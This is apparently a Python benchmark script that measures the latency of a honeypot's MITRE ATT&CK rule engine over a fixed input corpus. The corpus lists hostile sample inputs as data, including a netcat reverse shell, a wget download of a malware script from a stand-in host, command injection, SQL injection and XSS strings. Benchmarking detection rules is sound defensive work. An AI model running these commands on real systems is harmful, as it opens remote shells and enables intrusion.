"""Empirical benchmark timing script for DeceptionNet's deterministic MITRE ATT&CK rule engine (mitre.py).

Executes 10,000 evaluations across a representative corpus of 14 attack commands,
event types, and background noise inputs.
Measures execution latency using high-resolution time.perf_counter_ns()
and outputs statistical percentiles (mean, median, p95, p99, max) to results/rule_latency_benchmark.json.
"""
import sys
import os
import time
import json
import statistics

# Ensure core-api path is in import search path
base_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
core_api_path = os.path.join(base_dir, "core-api")
sys.path.insert(0, core_api_path)

from mitre import map_event_to_mitre

CORPUS = [
    ("command", "cat /etc/passwd"),
    ("command", "whoami"),
    ("command", "uname -a"),
    ("command", "ping -c 1 127.0.0.1; whoami"),
    ("command", "wget http://evil.example/malware.sh"),
    ("command", "nc -e /bin/sh 10.0.0.1 4444"),
    ("command", "iptables -F"),
    ("command", "echo 'hello world'"),
    ("sqli", "admin'--"),
    ("login_failed", None),
    ("login", None),
    ("file_upload", None),
    ("http", "/search?q=<script>alert(1)</script>"),
    ("scan", None),
]

def benchmark_rule_engine(iterations_per_sample=10000):
    latencies_us = []

    # Warmup
    for event_type, input_str in CORPUS:
        for _ in range(100):
            map_event_to_mitre(event_type, input_str)

    # Measured run
    for _ in range(iterations_per_sample):
        for event_type, input_str in CORPUS:
            t0 = time.perf_counter_ns()
            map_event_to_mitre(event_type, input_str)
            t1 = time.perf_counter_ns()
            latencies_us.append((t1 - t0) / 1000.0)  # microseconds

    latencies_us.sort()
    n = len(latencies_us)

    metrics = {
        "total_evaluations": n,
        "iterations_per_corpus": iterations_per_sample,
        "corpus_size": len(CORPUS),
        "mean_latency_us": round(statistics.mean(latencies_us), 3),
        "median_latency_us": round(statistics.median(latencies_us), 3),
        "stdev_latency_us": round(statistics.stdev(latencies_us), 3),
        "min_latency_us": round(min(latencies_us), 3),
        "p95_latency_us": round(latencies_us[int(0.95 * n)], 3),
        "p99_latency_us": round(latencies_us[int(0.99 * n)], 3),
        "max_latency_us": round(max(latencies_us), 3),
        "mean_latency_ms": round(statistics.mean(latencies_us) / 1000.0, 5),
        "p99_latency_ms": round(latencies_us[int(0.99 * n)] / 1000.0, 5),
    }

    out_file = os.path.join(base_dir, "results", "rule_latency_benchmark.json")
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(metrics, f, indent=2)

    print("=" * 60)
    print("MITRE ATT&CK RULE ENGINE LATENCY BENCHMARK")
    print("=" * 60)
    print(f"Total Evaluations : {n:,}")
    print(f"Mean Latency      : {metrics['mean_latency_us']:.3f} µs ({metrics['mean_latency_ms']:.5f} ms)")
    print(f"Median Latency    : {metrics['median_latency_us']:.3f} µs")
    print(f"p95 Latency       : {metrics['p95_latency_us']:.3f} µs")
    print(f"p99 Latency       : {metrics['p99_latency_us']:.3f} µs ({metrics['p99_latency_ms']:.5f} ms)")
    print(f"Max Latency       : {metrics['max_latency_us']:.3f} µs")
    print(f"Metrics saved to  : {out_file}")
    print("=" * 60)
    return metrics

if __name__ == "__main__":
    benchmark_rule_engine()
